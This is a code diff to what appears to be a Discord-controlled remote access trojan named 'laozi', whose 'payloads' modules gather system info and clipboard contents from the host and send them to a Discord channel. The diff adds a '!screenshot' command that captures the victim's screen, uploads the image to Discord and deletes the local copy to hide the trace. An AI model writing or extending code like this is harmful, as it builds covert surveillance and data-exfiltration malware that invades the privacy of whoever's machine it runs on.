@@ -4,6 +4,7 @@ import discord
 
 from laozi.payloads.systeminfo import get_sys_info
 from laozi.payloads.clipboard import get_clipboard
+from laozi.payloads.screenshot import get_screenshot
 from laozi.payloads.messagebox import display_messagebox
 
 
@@ -42,6 +43,8 @@ class DiscordBotClient(discord.Client):
             self.trigger_messagebox(command[7:])
         elif command.startswith("!clipboard"):
             await self.handle_clipboard(message.channel)
+        elif command.startswith("!screenshot"):
+            await self.handle_screenshot(message.channel)
 
     async def handle_system_info(self, channel):
         system_info = get_sys_info()
@@ -60,6 +63,14 @@ class DiscordBotClient(discord.Client):
             await channel.send(f"Clipboard content:\n```{clipboard_content}```")
         else:
             await channel.send("Clipboard is empty or unavailable.")
+
+    async def handle_screenshot(self, channel):
+        screenshot = get_screenshot()
+        if screenshot:
+            await channel.send(file=discord.File(screenshot))
+            os.remove(screenshot)
+        else:
+            await channel.send("Failed to capture screenshot.")
 
     @staticmethod
     def split_system_info(system_info):
